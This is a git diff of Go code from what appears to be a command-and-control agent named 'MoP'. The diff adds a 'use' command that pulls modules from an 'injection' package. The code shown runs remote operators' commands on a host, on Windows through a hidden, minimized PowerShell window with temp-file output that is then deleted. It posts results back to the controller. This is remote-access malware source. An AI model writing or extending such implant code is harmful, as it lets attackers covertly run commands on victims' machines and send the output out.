@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"MoP/injection"
 	"MoP/src/config"
 	"MoP/src/middlewares"
 	"MoP/src/models"
@@ -75,9 +76,12 @@ func HandleAgentCommands(ID int, command string, agent models.NewAgent) {
 	case "shell":
 		resp := shell(slicedCommand)
 		requests.PostCommand(ID, command, resp, agent)
+	case "use":
+		cmd := injection.HandleModules(command)
+		resp := shellCommand(cmd, agent)
+		requests.PostCommand(ID, command, resp, agent)
 	default:
 		resp := shellCommand(command, agent)
-		// resp := B64Encode("This command doesn't exists or not implemented yet!")
 		requests.PostCommand(ID, command, resp, agent)
 	}
 
@@ -257,7 +261,6 @@ func shellCommand(command string, agent models.NewAgent) string {
 	if agent.OS == "windows" {
 
 		tempFile := filepath.Join(tempDir, uuid.New().String()+".log")
-		fmt.Println(tempFile)
 
 		command += fmt.Sprintf(" | Out-File -FilePath %s", tempFile)
 		_, _ = exec.Command("cmd", "/c", "start", "/min", "", "powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy",
@@ -270,7 +273,11 @@ func shellCommand(command string, agent models.NewAgent) string {
 		}
 		resp = string(fileOpened)
 
-		os.Remove(tempFile)
+		err = os.Remove(tempFile)
+		if err != nil {
+			resp = fmt.Sprintf("Error to delete file: %s", err)
+			return middlewares.B64Encode(resp)
+		}
 
 	} else if agent.OS == "linux" {
 		output, _ := exec.Command("/bin/sh", "-c", command).CombinedOutput()
